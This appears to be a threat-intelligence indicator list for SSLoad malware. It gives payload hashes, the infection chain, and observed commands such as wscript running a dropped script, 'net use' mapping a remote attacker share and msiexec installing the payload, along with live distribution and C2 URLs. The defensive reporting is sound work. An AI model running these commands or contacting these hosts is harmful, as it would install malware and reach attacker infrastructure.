@@ -1,0 +1,49 @@
+17.04.2024 | SSLoad |
+
+*************************************************
+
+.url https://prominencedigiworld.com/wp-content/plugins/hot-random-image/index.html
+.js 092962bc268390debf17cd148d03147cdf919e442e61c92de01eac3bdb34b1c1
+.msi dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a
+.dll 3bca1dcaef4430272b9029c9a4bc8be0d45ecff66e8de8679ed30d8afab00f6f
+
+*************************************************
+
+url > .js > smb > .msi > .dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Doc_m42_81h118103-88o62135w8623-1999q9.js
+
+net use A: \\krd6.com@80\share\ /persistent:no
+
+msiexec.exe /I C:\Users\Admin\AppData\Local\Temp\avp.msi
+
+msiexec.exe /V
+
+MsiExec.exe -Embedding 9A17927D6A141664B03ED5253B17C098 C
+
+srtasks.exe ExecuteScopeRestorePoint /WaitForRestorePoint:2
+
+MsiExec.exe -Embedding 07DE11299EA9142225BACCC5743F8734
+
+vssvc.exe
+
+*************************************************
+
+distro
+
+https://prominencedigiworld.com/wp-content/plugins/hot-random-image/index.html
+https://gihibml.org/
+https://gihibml.org/vl.php
+http://krd6.com/share/
+
+*************************************************
+
+c2's
+
+http://85.239.53.219/api/gateway
+http://85.239.53.219/api/c179ca78-029d-b4b9-aaed-0594544569d8/tasks
+http://85.239.53.219/download?id=Nevada&module=2&filename=None
+http://85.239.53.219/api/c179ca78-029d-b4b9-aaed-0594544569d8/tasks
+http://85.239.53.219/api/c179ca78-029d-b4b9-aaed-0594544569d8/tasks
+
+*************************************************
